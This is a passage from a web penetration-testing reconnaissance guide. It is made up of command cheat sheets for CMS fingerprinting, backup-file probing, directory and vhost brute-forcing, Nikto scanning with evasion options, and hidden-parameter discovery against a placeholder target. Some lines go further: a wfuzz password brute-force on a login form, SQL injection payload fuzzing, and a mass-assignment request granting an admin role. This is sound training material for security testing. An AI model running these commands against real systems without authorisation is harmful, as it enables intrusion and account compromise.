# Common indicators
curl -I http://target.com/administrator/
curl -s http://target.com | grep -i joomla
curl -s http://target.com | grep -i "/media/system/"
curl -s http://target.com | grep -i "option=com_"

# Configuration file backups
curl -I http://target.com/configuration.php~
curl -I http://target.com/configuration.php.bak
curl -I http://target.com/configuration.php.old

# Component discovery
curl -s http://target.com | grep -oP 'option=com_\K[^&"]+' | sort -u

# Template discovery
curl -s http://target.com | grep -oP '/templates/\K[^/]+' | sort -u

# Module discovery
curl -s http://target.com | grep -oP '/modules/\K[^/]+' | sort -u

# User enumeration
curl -s "http://target.com/index.php?option=com_users&view=registration"
```

**Joomlascan (Alternative)**

```bash
# Install
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl -u http://target.com
```

### Drupal Detection and Enumeration

**Droopescan**

```bash
# Drupal scan
droopescan scan drupal -u http://target.com

# Enumerate plugins
droopescan scan drupal -u http://target.com -e p

# Enumerate themes
droopescan scan drupal -u http://target.com -e t

# Enumerate all
droopescan scan drupal -u http://target.com -e a

# Version detection
droopescan scan drupal -u http://target.com --number 20
```

**Manual Drupal Detection**

```bash
# Version from CHANGELOG.txt
curl -s http://target.com/CHANGELOG.txt | head -5

# Version from core/CHANGELOG.txt (Drupal 8+)
curl -s http://target.com/core/CHANGELOG.txt | head -5

# Common indicators
curl -s http://target.com | grep -i drupal
curl -s http://target.com | grep -i "Drupal.settings"
curl -I http://target.com/user/login
curl -I http://target.com/node

# Module discovery
curl -s http://target.com | grep -oP '/sites/[^/]+/modules/\K[^/"]+'  | sort -u
curl -s http://target.com | grep -oP '/modules/\K[^/"]+'  | sort -u

# Theme discovery
curl -s http://target.com | grep -oP '/themes/\K[^/"]+'  | sort -u

# Update status (may leak info)
curl -s http://target.com/admin/reports/updates

# Default files
curl -I http://target.com/sites/default/files/
curl -I http://target.com/INSTALL.txt
curl -I http://target.com/LICENSE.txt

# REST API
curl -s http://target.com/jsonapi
curl -s http://target.com/rest

# User enumeration
curl -s http://target.com/user/1
curl -s http://target.com/users
```

**Drupal CMSmap**

```bash
cmsmap -t http://target.com -f D
```

### Other CMS Detection

**Magento**

```bash
# Magescan
php magescan.phar scan:all target.com

# Manual detection
curl -s http://target.com | grep -i magento
curl -I http://target.com/downloader/
curl -I http://target.com/admin/
curl -s http://target.com/magento_version
curl -s http://target.com/skin/frontend/

# Version detection
curl -s http://target.com/RELEASE_NOTES.txt
curl -s http://target.com/js/mage/ | grep -oP 'version: "\K[^"]+'
```

**SharePoint**

```bash
# SPScan
python spscan.py -u http://target.com

# Manual detection
curl -s http://target.com | grep -i sharepoint
curl -s http://target.com | grep -i "_layouts"
curl -I http://target.com/_layouts/viewlsts.aspx
curl -I http://target.com/_vti_bin/

# Version from headers
curl -I http://target.com | grep -i "MicrosoftSharePointTeamServices"
curl -I http://target.com | grep -i "SPRequestGuid"
```

**Typo3**

```bash
# Detection
curl -s http://target.com | grep -i typo3
curl -I http://target.com/typo3/
curl -I http://target.com/typo3conf/

# Version
curl -s http://target.com/typo3/sysext/core/Documentation/Changelog/
```

**PrestaShop**

```bash
# Detection
curl -s http://target.com | grep -i prestashop
curl -I http://target.com/admin-dev/
curl -I http://target.com/modules/

# Version
curl -s http://target.com/docs/CHANGELOG.txt
```

**OpenCart**

```bash
# Detection
curl -s http://target.com | grep -i opencart
curl -I http://target.com/admin/
curl -s http://target.com/index.php?route=common/home

# Version
curl -s http://target.com/admin/view/javascript/jquery/
```

## Directory/File Enumeration

### Gobuster

**Basic Directory Enumeration**

```bash
# Simple directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With specific extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Multiple extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak,old,sql,zip

# Lowercase wordlist
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -l

# Include status codes
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -s 200,204,301,302,307,401,403

# Exclude status codes
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -b 404,400

# Follow redirects
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -r

# Custom user agent
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0..."

# With cookies
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -c "PHPSESSID=abc123"

# Through proxy
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt --proxy http://127.0.0.1:8080

# Increase threads
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50

# Timeout adjustment
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt --timeout 10s

# Output to file
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o output.txt

# Recursive enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -r -d 3  # Depth 3
```

**DNS Subdomain Enumeration**

```bash
# Subdomain brute force
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt

# With specific resolvers
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt -r 8.8.8.8,1.1.1.1

# Show CNAMEs
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt -c

# Wildcard handling
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt --wildcard
```

**VHost Enumeration**

```bash
# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Append domain
gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### Dirsearch

**Basic Usage**

```bash
# Simple scan
dirsearch -u http://target.com

# Specific extensions
dirsearch -u http://target.com -e php,html,txt,js

# Multiple extensions
dirsearch -u http://target.com -e php,txt,html,js,bak,old,sql,zip,tar,gz

# Custom wordlist
dirsearch -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Force extensions on every word
dirsearch -u http://target.com -e php -f

# Exclude status codes
dirsearch -u http://target.com -x 403,404,400,500

# Recursive scan
dirsearch -u http://target.com -e php -r

# Recursion depth
dirsearch -u http://target.com -e php -r --recursion-depth=3

# Thread count
dirsearch -u http://target.com -t 50

# Delay between requests
dirsearch -u http://target.com --delay=1

# Random user agent
dirsearch -u http://target.com --random-agent

# Custom user agent
dirsearch -u http://target.com -H "User-Agent: CustomAgent"

# With cookies
dirsearch -u http://target.com -H "Cookie: session=abc123"

# Custom headers
dirsearch -u http://target.com -H "Authorization: Bearer token"

# Through proxy
dirsearch -u http://target.com --proxy=127.0.0.1:8080

# Match regex
dirsearch -u http://target.com --include-status=200-399

# Plain text report
dirsearch -u http://target.com -o output.txt

# JSON report
dirsearch -u http://target.com --format=json -o output.json

# Subdirectory scan
dirsearch -u http://target.com/admin/ -e php

# Multiple URLs
dirsearch -l urls.txt -e php

# Full URL in output
dirsearch -u http://target.com --full-url

# Exclude directories
dirsearch -u http://target.com --exclude-subdirs=images,css,js
```

**Advanced Dirsearch**

```bash
# Maximum response time
dirsearch -u http://target.com --max-time=10

# Minimum response size
dirsearch -u http://target.com --min-response-size=100

# Maximum response size
dirsearch -u http://target.com --max-response-size=10000000

# Scan with multiple extensions and recursion
dirsearch -u http://target.com -e php,html,txt,bak -r --recursion-depth=2 -t 30

# Scan with prefix/suffix
dirsearch -u http://target.com -e php --prefixes backup,old,tmp --suffixes _old,_backup,.bak
```

### Feroxbuster

**Basic Usage**

```bash
# Simple scan
feroxbuster -u http://target.com

# Custom wordlist
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Extensions
feroxbuster -u http://target.com -x php,txt,html,js

# Multiple extensions
feroxbuster -u http://target.com -x php,txt,html,js,bak,old,sql,zip

# Depth
feroxbuster -u http://target.com --depth 3

# Threads
feroxbuster -u http://target.com -t 50

# Timeout
feroxbuster -u http://target.com --timeout 10

# Filter status codes
feroxbuster -u http://target.com -C 404,403

# Match status codes
feroxbuster -u http://target.com -s 200,301,302

# Filter size
feroxbuster -u http://target.com -S 1234  # Filter responses of size 1234

# Auto-filter (smart 404 detection)
feroxbuster -u http://target.com --auto-tune

# Follow redirects
feroxbuster -u http://target.com -r

# Extract links
feroxbuster -u http://target.com --extract-links

# Headers
feroxbuster -u http://target.com -H "Cookie: session=abc" -H "User-Agent: Custom"

# Proxy
feroxbuster -u http://target.com -p http://127.0.0.1:8080

# Output
feroxbuster -u http://target.com -o output.txt

# JSON output
feroxbuster -u http://target.com --json -o output.json

# Insecure SSL
feroxbuster -u https://target.com -k

# Rate limit
feroxbuster -u http://target.com --rate-limit 50  # 50 requests/sec

# Scan multiple targets
feroxbuster --stdin < urls.txt

# Resume scan
feroxbuster -u http://target.com --resume-from state.txt
```

**Advanced Feroxbuster**

```bash
# Smart scanning with recursion and extraction
feroxbuster -u http://target.com -x php,html,txt -t 50 --extract-links --auto-tune --depth 4

# Thorough scan with filters
feroxbuster -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak -t 30 -C 404 --auto-tune -r

# Wordlist with extensions forced
feroxbuster -u http://target.com -w wordlist.txt -x php --force-recursion
```

### FFUF (Fuzz Faster U Fool)

**Directory Fuzzing**

```bash
# Basic directory fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# With extensions
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dir
```


**Directory Fuzzing with Extensions**

```bash
# Extensions in URL
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.js,.bak

# Multiple wordlists
ffuf -u http://target.com/W1.W2 -w /usr/share/wordlists/dirb/common.txt:W1 -w extensions.txt:W2

# Recursive fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -recursion-depth 2

# Filter by status code
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

# Filter out status codes
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404,403

# Filter by response size
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 1234

# Filter by word count
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 100

# Filter by line count
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fl 20

# Match regex
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mr "admin|login"

# Filter regex
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fr "Not Found"

# Threads
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50

# Rate limit
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -rate 100

# Delay between requests
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -p 0.5

# Timeout
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -timeout 10

# Follow redirects
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -r

# Custom headers
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Cookie: session=abc123"

# Proxy
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -x http://127.0.0.1:8080

# Output formats
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.json -of json
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.html -of html
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.csv -of csv

# Silent mode (only results)
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -s

# Verbose mode
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -v

# Auto-calibration (smart filtering)
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac
```

**Virtual Host Fuzzing**

```bash
# VHost discovery
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Filter by size to remove default vhost
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234

# With auto-calibration
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```

**Parameter Fuzzing**

```bash
# GET parameter fuzzing
ffuf -u http://target.com/page?FUZZ=value -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt

# POST parameter fuzzing
ffuf -u http://target.com/page -X POST -d "FUZZ=value" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt

# Multiple parameters
ffuf -u http://target.com/page?param1=FUZZ1&param2=FUZZ2 -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2

# JSON parameter fuzzing
ffuf -u http://target.com/api -X POST -d '{"FUZZ":"value"}' -H "Content-Type: application/json" -w params.txt
```

**Advanced FFUF Techniques**

```bash
# Combined directory and extension fuzzing
ffuf -u http://target.com/FUZZFILE.FUZZEXT -w /usr/share/wordlists/dirb/common.txt:FUZZFILE -w extensions.txt:FUZZEXT

# Nested fuzzing (subdirectories)
ffuf -u http://target.com/DIR/FUZZ -w dirs.txt:DIR -w files.txt:FUZZ -recursion

# Match response time (timing attacks)
ffuf -u http://target.com/FUZZ -w wordlist.txt -mt '>500'  # Responses taking more than 500ms

# Complex filtering
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301 -fs 1234,5678 -fw 100 -ac
```

### WFuzz

**Basic Directory Fuzzing**

```bash
# Simple fuzzing
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ

# With extensions
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -z list,php-txt-html http://target.com/FUZZ.FUZ2Z

# Hide responses by status code
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ

# Show only specific codes
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --sc 200,301,302 http://target.com/FUZZ

# Hide by number of characters
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hh 1234 http://target.com/FUZZ

# Hide by number of words
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hw 100 http://target.com/FUZZ

# Hide by number of lines
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hl 20 http://target.com/FUZZ

# Threads
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -t 50 http://target.com/FUZZ

# Follow redirects
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --follow http://target.com/FUZZ

# Custom headers
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -H "Cookie: session=abc" http://target.com/FUZZ

# Proxy
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -p 127.0.0.1:8080 http://target.com/FUZZ

# Output to file
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -o output.txt http://target.com/FUZZ
```

**Advanced WFuzz**

```bash
# POST data fuzzing
wfuzz -c -z file,wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login

# Multiple injection points
wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" http://target.com/login

# JSON fuzzing
wfuzz -c -z file,wordlist.txt -H "Content-Type: application/json" -d '{"param":"FUZZ"}' http://target.com/api

# Header fuzzing
wfuzz -c -z file,wordlist.txt -H "X-Custom-Header: FUZZ" http://target.com

# Cookie fuzzing
wfuzz -c -z file,wordlist.txt -b "session=FUZZ" http://target.com

# User agent fuzzing
wfuzz -c -z file,user-agents.txt -H "User-Agent: FUZZ" http://target.com

# Subdomain enumeration
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.target.com" --hc 400,404 http://target.com

# Range-based fuzzing
wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ

# Baseline request for comparison
wfuzz -c -z file,wordlist.txt --hc BBB http://target.com/FUZZ
```

### Nikto

**Basic Web Server Scanning**

```bash
# Simple scan
nikto -h http://target.com

# Specific port
nikto -h target.com -p 80,443,8080

# SSL scan
nikto -h https://target.com -ssl

# Scan multiple hosts
nikto -h targets.txt

# With specific plugins
nikto -h http://target.com -Plugins "headers,cgi"

# List all plugins
nikto -list-plugins

# Tuning options (specific test categories)
nikto -h http://target.com -Tuning x  # Reverse proxy
nikto -h http://target.com -Tuning 123456789abc

# Tuning options:
# 1 - Interesting File / Seen in logs
# 2 - Misconfiguration / Default File
# 3 - Information Disclosure
# 4 - Injection (XSS/Script/HTML)
# 5 - Remote File Retrieval
# 6 - Denial of Service
# 7 - Remote File Retrieval - Server Wide
# 8 - Command Execution / Remote Shell
# 9 - SQL Injection
# 0 - File Upload
# a - Authentication Bypass
# b - Software Identification
# c - Remote Source Inclusion
# x - Reverse Proxy

# Custom user agent
nikto -h http://target.com -useragent "Mozilla/5.0..."

# Through proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Authentication
nikto -h http://target.com -id username:password

# Virtual host
nikto -h target.com -vhost subdomain.target.com

# Output formats
nikto -h http://target.com -o output.txt
nikto -h http://target.com -o output.html -Format html
nikto -h http://target.com -o output.xml -Format xml
nikto -h http://target.com -o output.csv -Format csv

# Timeout
nikto -h http://target.com -timeout 5

# No 404 checking
nikto -h http://target.com -no404

# Evasion techniques
nikto -h http://target.com -evasion 1234567

# Evasion options:
# 1 - Random URI encoding
# 2 - Directory self-reference
# 3 - Premature URL ending
# 4 - Prepend long random string
# 5 - Fake parameter
# 6 - TAB as request spacer
# 7 - Change case
# 8 - Use Windows directory separator

# Maximum execution time
nikto -h http://target.com -maxtime 30m

# Update database
nikto -update
```

### Custom Directory Enumeration

**Using cURL with Wordlist**

```bash
#!/bin/bash
# Simple directory enumeration script

TARGET="http://target.com"
WORDLIST="/usr/share/wordlists/dirb/common.txt"

while read dir; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$dir")
    if [ "$response" != "404" ]; then
        echo "[$response] $TARGET/$dir"
    fi
done < "$WORDLIST"
```

**Multi-threaded with GNU Parallel**

```bash
# Directory enumeration with parallel
cat /usr/share/wordlists/dirb/common.txt | parallel -j 50 'curl -s -o /dev/null -w "%{http_code} http://target.com/{}\n" http://target.com/{} | grep -v "404"'

# With extensions
cat wordlist.txt | parallel -j 50 'for ext in php html txt; do curl -s -o /dev/null -w "%{http_code} http://target.com/{}.${ext}\n" http://target.com/{}.${ext}; done' | grep -v "404"
```

### Wordlist Selection

**Common Wordlists for Web Enumeration**

```bash
# DirBuster wordlists
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# SecLists
/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt

# CMS-specific
/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/drupal.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/joomla.txt

# API endpoints
/usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/swagger.txt

# Backup files
/usr/share/wordlists/SecLists/Discovery/Web-Content/backup-files.txt

# CGI files
/usr/share/wordlists/SecLists/Discovery/Web-Content/CGIs.txt
```

**Creating Custom Wordlists**

```bash
# Extract from website content
cewl http://target.com -m 3 -d 2 -w custom_wordlist.txt

# With metadata
cewl http://target.com -m 3 --with-numbers -w wordlist.txt

# Spider depth
cewl http://target.com -d 3 -w wordlist.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Add common extensions
for word in $(cat wordlist.txt); do
    echo "$word"
    echo "$word.php"
    echo "$word.html"
    echo "$word.txt"
    echo "$word.bak"
done > wordlist_with_extensions.txt

# Generate permutations
john --wordlist=wordlist.txt --rules --stdout > permutations.txt
```

## Hidden Parameter Discovery

### Parameter Brute-forcing with Arjun

**Basic Usage**

```bash
# Simple parameter discovery
arjun -u http://target.com/page

# GET parameters
arjun -u http://target.com/page -m GET

# POST parameters
arjun -u http://target.com/page -m POST

# JSON parameters
arjun -u http://target.com/api -m JSON

# Custom headers
arjun -u http://target.com/page -H "Cookie: session=abc123"

# Include default parameters
arjun -u http://target.com/page --include

# Custom wordlist
arjun -u http://target.com/page -w custom_params.txt

# Threads
arjun -u http://target.com/page -t 50

# Delay between requests
arjun -u http://target.com/page -d 0.5

# Stable response detection
arjun -u http://target.com/page --stable

# Import from Burp
arjun -i burp_requests.xml

# Output JSON
arjun -u http://target.com/page -o output.json

# Passive mode (only wordlist)
arjun -u http://target.com/page --passive
```

**Advanced Arjun**

```bash
# Multiple URLs
arjun -i urls.txt -t 10

# With authentication
arjun -u http://target.com/page -H "Authorization: Bearer token123"

# Specific detection method
arjun -u http://target.com/page --detection-method status

# Detection methods:
# - status: Status code differences
# - time: Response time differences
# - length: Response length differences
# - redirect: Redirect location differences
```

### Parameter Discovery with FFUF

**GET Parameter Fuzzing**

```bash
# Basic parameter discovery
ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -ac

# Filter by response difference
ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234

# Multiple parameters
ffuf -u "http://target.com/page?param1=value&FUZZ=test" -w params.txt -ac

# Parameter value fuzzing
ffuf -u "http://target.com/page?id=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/SQLi/Generic-SQLi.txt -mc 200,500
```

**POST Parameter Fuzzing**

```bash
# POST data
ffuf -u http://target.com/page -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -ac

# Multiple POST parameters
ffuf -u http://target.com/page -X POST -d "username=admin&FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -w params.txt -ac

# JSON parameter discovery
ffuf -u http://target.com/api -X POST -d '{"FUZZ":"test"}' -H "Content-Type: application/json" -w params.txt -mc 200 -ac

# Nested JSON parameters
ffuf -u http://target.com/api -X POST -d '{"user":{"FUZZ":"test"}}' -H "Content-Type: application/json" -w params.txt -ac
```

**Header Parameter Fuzzing**

```bash
# Custom header discovery
ffuf -u http://target.com -H "FUZZ: test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/custom-headers.txt -ac

# X-headers discovery
ffuf -u http://target.com -H "X-FUZZ: test" -w common-headers.txt -ac

# Common header parameters to test
X-Forwarded-For
X-Forwarded-Host
X-Original-URL
X-Rewrite-URL
X-Remote-IP
X-Remote-Addr
X-Client-IP
```

### Parameter Mining from JavaScript

**Extract from JavaScript Files**

```bash
# Find JavaScript files
curl -s http://target.com | grep -oP 'src="[^"]+\.js"' | cut -d'"' -f2

# Download all JS files
wget -r -l1 -H -t1 -nd -N -np -A.js -erobots=off http://target.com

# Extract potential parameters from JS
grep -rEoh "(param|parameter|arg|argument|key|field|id|name)[\"\']?\s*[:=]\s*[\"\']?[a-zA-Z0-9_-]+" *.js

# Using regex patterns
grep -rEoh "(\?|&)[a-zA-Z0-9_-]+=" *.js | cut -d'=' -f1 | sort -u

# API endpoints from JS
grep -rEoh "https?://[^\"'> ]+" *.js | sort -u

# LinkFinder tool
python3 linkfinder.py -i http://target.com -o results.html

# With depth
python3 linkfinder.py -i http://target.com -d -o results.html
```

**Automated JS Analysis**

```bash
# Using getJS
getJS --url http://target.com --output js_files.txt

# Download and analyze
cat js_files.txt | while read url; do
    curl -s "$url" | grep -Eo "(param|key|field|arg)[\"']?\s*[:=]"
done

# JSParser
python3 jsparser.py -u http://target.com

# SecretFinder
python3 SecretFinder.py -i http://target.com -o findings.html

# Relative-url-extractor
python3 relative-url-extractor.py http://target.com
```

### Param Miner (Burp Extension Alternative - CLI)

**Manual Parameter Mining**

```bash
# Guess common parameter names
common_params=(
    "id" "page" "redirect" "url" "callback" "return"
    "next" "ref" "file" "path" "folder" "document"
    "debug" "test" "admin" "user" "username" "email"
    "token" "key" "api_key" "access_token" "session"
    "cmd" "command" "exec" "query" "search" "q"
    "data" "input" "output" "format" "type" "action"
)

for param in "${common_params[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/page?$param=test")
    baseline=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/page")
    if [ "$response" != "$baseline" ]; then
        echo "Potential parameter found: $param"
    fi
done
```

**Differential Analysis Script**

```bash
#!/bin/bash
# Parameter discovery via response comparison

URL="http://target.com/page"
WORDLIST="/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt"

# Get baseline
baseline_size=$(curl -s "$URL" | wc -c)
baseline_code=$(curl -s -o /dev/null -w "%{http_code}" "$URL")

echo "Baseline: $baseline_code ($baseline_size bytes)"

while read param; do
    test_url="${URL}?${param}=test"
    response_code=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")
    response_size=$(curl -s "$test_url" | wc -c)
    
    # Check for differences
    if [ "$response_code" != "$baseline_code" ] || [ "$response_size" != "$baseline_size" ]; then
        echo "[+] Param: $param | Code: $response_code | Size: $response_size"
    fi
done < "$WORDLIST"
```

### HTTP Parameter Pollution (HPP) Testing

**Duplicate Parameter Testing**

```bash
# Test with duplicate parameters
curl "http://target.com/page?id=1&id=2"
curl "http://target.com/page?id=1&id=2&id=3"

# Different values
curl "http://target.com/page?email=user@example.com&email=admin@example.com"

# With special characters
curl "http://target.com/page?param=value1&param=value2%00value3"

# Array-style parameters
curl "http://target.com/page?id[]=1&id[]=2"
curl "http://target.com/page?id[0]=1&id[1]=2"
```

**Testing Parameter Precedence**

```bash
# URL encoding variations
curl "http://target.com/page?param=value1&param=value2"
curl "http://target.com/page?param=value1&PARAM=value2"
curl "http://target.com/page?param=value1&param%3D=value2"

# POST + GET combination
curl -X POST "http://target.com/page?id=1" -d "id=2"

# Different content types
curl -X POST "http://target.com/page" -H "Content-Type: application/json" -d '{"id":"1"}' --get -d "id=2"
```

### Cookie Parameter Discovery

**Cookie Fuzzing**

```bash
# Fuzz cookie names
ffuf -u http://target.com -H "Cookie: FUZZ=test" -w cookie-names.txt -ac

# Fuzz cookie values
ffuf -u http://target.com -H "Cookie: session=FUZZ" -w values.txt -ac

# Common cookie names to test
common_cookies=(
    "session" "sessionid" "sess" "token" "auth"
    "user" "userid" "username" "admin" "debug"
    "test" "dev" "tracking" "analytics" "preferences"
)

for cookie in "${common_cookies[@]}"; do
    response=$(curl -s -H "Cookie: $cookie=test" http://target.com | wc -c)
    echo "$cookie: $response bytes"
done
```

### Hidden Form Field Discovery

**Extract Form Fields**

```bash
# Extract all forms
curl -s http://target.com | grep -oP '<form[^>]*>.*?</form>' | sed 's/></>\n</g'

# Extract input fields
curl -s http://target.com | grep -oP '<input[^>]+>' | grep -oP 'name="[^"]+"' | cut -d'"' -f2 | sort -u

# Extract hidden fields
curl -s http://target.com | grep -oP '<input[^>]+type="hidden"[^>]*>' | grep -oP 'name="[^"]+"'

# Extract all parameter names
curl -s http://target.com | grep -oP 'name="[^"]+"' | cut -d'"' -f2 | sort -u
```

**Test Hidden Parameters in Forms**

```bash
# Add extra parameters to form submission
curl -X POST http://target.com/submit \
  -d "username=admin&password=pass&debug=1&admin=true"

# Test with various boolean values
for param in debug admin test dev; do
    curl -X POST http://target.com/submit \
      -d "username=test&password=test&$param=1"
done
```

### API Parameter Discovery

**REST API Parameter Testing**

```bash
# Common API parameters
api_params=(
    "limit" "offset" "page" "per_page" "count"
    "sort" "order" "filter" "fields" "include"
    "exclude" "expand" "format" "pretty" "debug"
    "callback" "jsonp" "api_key" "access_token"
)

# Test each parameter
for param in "${api_params[@]}"; do
    curl -s "http://target.com/api/endpoint?$param=1" | jq . 2>/dev/null
done

# Mass assignment testing
curl -X POST http://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","role":"admin","isAdmin":true}'
```

**GraphQL Parameter Discovery**

```bash
# Introspection query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name fields { name } } } }"}'

# Field suggestions
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'
```

**Important Subtopics**

**WAF Detection and Fingerprinting** - identifying Web Application Firewalls and security solutions protecting the target **SSL/TLS Configuration Analysis** - comprehensive certificate and cipher suite assessment beyond basic identification **Web Cache Poisoning Detection** - identifying cache behavior that could lead to exploitation **API Versioning and Endpoint Discovery** - systematic REST/GraphQL/SOAP API enumeration techniques

---

## Web Technology Stack Identification

### Purpose and Methodology

Technology stack identification reveals the underlying frameworks, libraries, server software, and languages used by a web application. This information guides subsequent exploitation attempts by identifying version-specific vulnerabilities and attack surfaces.

